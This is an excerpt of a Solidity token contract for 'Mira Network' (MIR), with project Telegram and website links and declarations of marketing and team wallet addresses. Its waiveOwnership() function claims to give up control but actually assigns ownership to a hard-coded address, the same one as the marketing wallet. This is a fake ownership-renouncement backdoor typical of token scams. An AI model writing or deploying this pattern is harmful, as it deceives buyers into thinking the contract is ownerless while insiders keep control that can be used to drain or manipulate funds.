...
Telegram https://t.me/miranetwork
Website https://miranetwork.org/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x12d29d832a0FD14b2Fb34DaC8dd695b58703Bd9e);
    }
...
contract MiraNetwork is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Mira Network";
    string private _symbol = "MIR";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x12d29d832a0FD14b2Fb34DaC8dd695b58703Bd9e);
    address payable public teamWalletAddress = payable(0xBade93b17EC2f48aa46F524310097E6f35B6800A);
